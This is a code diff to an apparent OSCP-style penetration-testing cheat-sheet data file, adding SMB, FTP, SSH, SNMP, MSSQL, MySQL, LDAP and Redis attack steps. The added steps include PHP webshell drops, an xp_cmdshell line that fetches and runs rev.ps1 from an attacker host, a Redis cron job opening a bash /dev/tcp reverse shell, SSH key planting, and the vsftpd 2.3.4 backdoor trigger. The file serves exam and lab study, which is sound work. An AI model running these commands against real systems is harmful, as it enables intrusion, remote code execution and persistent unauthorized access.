@@ -10,11 +10,11 @@ const serviceEnum: OscpContent = {
             phase: 'service-enum',
             os: 'windows',
             description:
-                'Check the version (ms17-010), then list shares and users - anonymously and with any creds you hold.',
+                'Check the version (ms17-010, and ms08-067 / ms09-050 on XP-era boxes), then list shares and users - anonymously and with any creds you hold.',
             commands: [
                 {
                     label: 'Version + vuln scripts',
-                    code: 'nmap -p445 --script "smb-os-discovery,smb-protocols,smb-vuln-ms17-010" <target>',
+                    code: 'nmap -p445 --script "smb-os-discovery,smb-protocols,smb-vuln-ms17-010,smb-vuln-ms08-067" <target>',
                 },
                 {
                     label: 'List shares (null / guest / creds)',
@@ -49,6 +49,15 @@ smb: \\> mget *`,
                     label: 'Mirror a whole share',
                     code: "netexec smb <target> -u '' -p '' -M spider_plus",
                 },
+                {
+                    label: 'Writable share -> foothold',
+                    code: `smbclient //<target>/<share> -N -c 'put backup.ps1'
+# web root share -> webshell; startup share -> persistence`,
+                },
+                {
+                    label: 'Auth as guest + spider',
+                    code: "netexec smb <target> -u guest -p '' --shares --spider <share> --pattern txt,ps1,xml,ini,conf",
+                },
             ],
             tags: ['smb', 'null-session', 'guest', 'shares', 'loot'],
         },
@@ -60,6 +69,18 @@ smb: \\> mget *`,
             os: 'windows',
             description:
                 'Old SMBv1 (ms17-010 EternalBlue) or a flagged CVE. Go straight to a public exploit.',
+            commands: [
+                {
+                    label: 'Confirm EternalBlue',
+                    code: `nmap -p445 --script smb-vuln-ms17-010 <target>
+netexec smb <target> -M ms17-010`,
+                },
+                {
+                    label: 'Public exploit (read first)',
+                    code: `searchsploit ms17-010
+# MSF only if allowed: exploit/windows/smb/ms17_010_eternalblue`,
+                },
+            ],
             tags: ['ms17-010', 'eternalblue', 'cve', 'smbv1'],
         },
         {
@@ -77,6 +98,17 @@ smb: \\> mget *`,
 # or non-interactive:
 wget -m --no-passive ftp://anonymous:anonymous@<target>`,
                 },
+                {
+                    label: 'Banner + vsftpd 2.3.4',
+                    code: `nc -nv <target> 21
+# vsftpd 2.3.4 backdoor: USER <anything>:)
+# then connect to port 6200 for a root shell`,
+                },
+                {
+                    label: 'List + download',
+                    code: `curl ftp://anonymous:anonymous@<target>/
+wget -m --no-passive ftp://anonymous:anonymous@<target>`,
+                },
             ],
             tags: ['ftp', '21', 'anonymous', 'vsftpd'],
         },
@@ -88,6 +120,30 @@ wget -m --no-passive ftp://anonymous:anonymous@<target>`,
             os: 'agnostic',
             description:
                 'You can upload. If the FTP directory is served by the web server, drop a webshell and browse to it.',
+            commands: [
+                {
+                    label: 'Drop a webshell via FTP',
+                    code: `echo '<?php system($_GET["c"]); ?>' > sh.php
+ftp -n <target> <<'EOF'
+user anonymous anonymous
+binary
+put sh.php
+quit
+EOF
+curl "http://<target>/sh.php?c=id"`,
+                },
+                {
+                    label: 'Confirm write + locate the web root',
+                    code: `ftp -n <target> <<'EOF'
+user anonymous anonymous
+pwd
+ls -la
+mkdir testdir
+quit
+EOF
+# if FTP root maps to the web root, the uploaded sh.php is immediate RCE`,
+                },
+            ],
             tags: ['ftp', 'upload', 'webshell'],
         },
         {
@@ -102,6 +158,18 @@ wget -m --no-passive ftp://anonymous:anonymous@<target>`,
                 {
                     label: 'Auth methods',
                     code: 'ssh -v <user>@<target>   # watch for publickey/password',
+                },
+                {
+                    label: 'Banner + auth methods',
+                    code: `nc -nv <target> 22
+nmap -p22 --script ssh-auth-methods,ssh-hostkey <target>
+ssh-keyscan -t rsa,ecdsa,ed25519 <target>`,
+                },
+                {
+                    label: 'Key auth',
+                    code: `chmod 600 id_rsa
+ssh -i id_rsa -o IdentitiesOnly=yes <user>@<target>
+# encrypted key -> ssh2john + john/hashcat -m 22921 / 10300`,
                 },
             ],
             tags: ['ssh', '22', 'openssh'],
@@ -125,6 +193,12 @@ snmpwalk -c public -v2c <target> 1.3.6.1.2.1.25.4.2.1.2   # processes`,
                 {
                     label: 'Brute community strings',
                     code: 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>',
+                },
+                {
+                    label: 'v1 walk (users / processes)',
+                    code: `snmpwalk -c public -v1 <target>
+snmpwalk -c public -v1 <target> 1.3.6.1.4.1.77.1.2.25    # Windows users
+snmpwalk -c public -v1 <target> 1.3.6.1.2.1.25.4.2.1.2   # running processes`,
                 },
             ],
             tags: ['snmp', '161', 'udp', 'snmpwalk', 'community'],
@@ -152,6 +226,10 @@ EXEC xp_cmdshell 'whoami';`,
                     label: 'Coerce NetNTLMv2 (no RCE needed)',
                     code: "EXEC xp_dirtree '\\\\<kali-ip>\\share', 1, 1;   # capture with responder",
                 },
+                {
+                    label: 'Reverse shell via xp_cmdshell',
+                    code: `EXEC xp_cmdshell 'powershell -nop -c "iex (iwr -UseBasicParsing http://<kali-ip>/rev.ps1)"';`,
+                },
             ],
             tags: ['mssql', '1433', 'xp_cmdshell', 'impacket'],
         },
@@ -169,6 +247,18 @@ EXEC xp_cmdshell 'whoami';`,
                     code: `mysql -h <target> -u <user> -p
 SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php';`,
                 },
+                {
+                    label: 'No-pass / default creds',
+                    code: `mysql -h <target> -u root -p
+mysql -h <target> -u root          # empty pass
+netexec mysql <target> -u root -p ''`,
+                },
+                {
+                    label: 'FILE priv + LOAD_FILE',
+                    code: `SHOW GRANTS;
+SELECT LOAD_FILE('/etc/passwd');
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/sh.php';`,
+                },
             ],
             tags: ['mysql', '3306', 'outfile', 'file-priv'],
         },
@@ -185,6 +275,11 @@ SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php';`,
                     label: 'Anonymous bind + base',
                     code: `ldapsearch -x -H ldap://<target> -s base namingcontexts
 ldapsearch -x -H ldap://<target> -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName description`,
+                },
+                {
+                    label: 'Authenticated dump',
+                    code: `ldapsearch -x -H ldap://<target> -D '<user>@<domain>' -w '<pass>' -b 'DC=corp,DC=com' '(objectClass=user)' sAMAccountName description memberOf
+netexec ldap <target> -u <user> -p <pass> --users --groups`,
                 },
             ],
             tags: ['ldap', '389', '636', 'dc', 'ldapsearch'],
@@ -204,11 +299,51 @@ ldapsearch -x -H ldap://<target> -b "DC=corp,DC=com" "(objectClass=user)" sAMAcc
 searchsploit -m <id>          # copy PoC locally
 searchsploit -x <id>          # read it first`,
                 },
+                {
+                    label: 'Google / GitHub / nmap scripts',
+                    code: `searchsploit -w <product>
+ls /usr/share/nmap/scripts | grep -i <product>
+# after copy: fix LHOST/LPORT/offsets, run in a throwaway VM`,
+                },
             ],
             references: [
                 { label: 'Exploit-DB', url: 'https://www.exploit-db.com/' },
             ],
             tags: ['searchsploit', 'exploit-db', 'cve', 'poc'],
+        },
+        {
+            id: 'redis-enum',
+            title: 'Enumerate Redis',
+            type: 'technique',
+            phase: 'service-enum',
+            os: 'agnostic',
+            description:
+                'Redis (6379) is often exposed with no auth. With no password, write your SSH key to ~/.ssh/authorized_keys or plant a root cron job for a reverse shell; on a web box, drop a webshell via a writable web dir.',
+            commands: [
+                {
+                    label: 'No-auth check + SSH key write',
+                    code: `redis-cli -h <target> ping
+redis-cli -h <target> -x SET mykey < ~/.ssh/id_rsa.pub
+redis-cli -h <target> CONFIG SET dir /home/<user>/.ssh
+redis-cli -h <target> CONFIG SET dbfilename authorized_keys
+redis-cli -h <target> SAVE`,
+                },
+                {
+                    label: 'Cron reverse shell',
+                    code: `redis-cli -h <target> CONFIG SET dir /var/spool/cron/crontabs
+redis-cli -h <target> CONFIG SET dbfilename root
+redis-cli -h <target> SET x '\\n* * * * * bash -i >& /dev/tcp/<kali-ip>/443 0>&1\\n'
+redis-cli -h <target> SAVE`,
+                },
+                {
+                    label: 'Webshell via web dir',
+                    code: `redis-cli -h <target> CONFIG SET dir /var/www/html
+redis-cli -h <target> CONFIG SET dbfilename sh.php
+redis-cli -h <target> SET x '<?php system($_GET["c"]); ?>'
+redis-cli -h <target> SAVE`,
+                },
+            ],
+            tags: ['redis', '6379', 'ssh-key', 'cron', 'unauthenticated'],
         },
     ],
     edges: [
@@ -268,6 +403,12 @@ searchsploit -x <id>          # read it first`,
             from: 'public-exploit-search',
             to: 'foothold-windows',
             label: 'exploit lands (Windows)',
+        },
+        { from: 'redis-enum', to: 'foothold-linux', label: 'SSH key / cron -> shell' },
+        {
+            from: 'smb-anon-access',
+            to: 'foothold-windows',
+            label: 'writable startup / scheduled script',
         },
     ],
 }
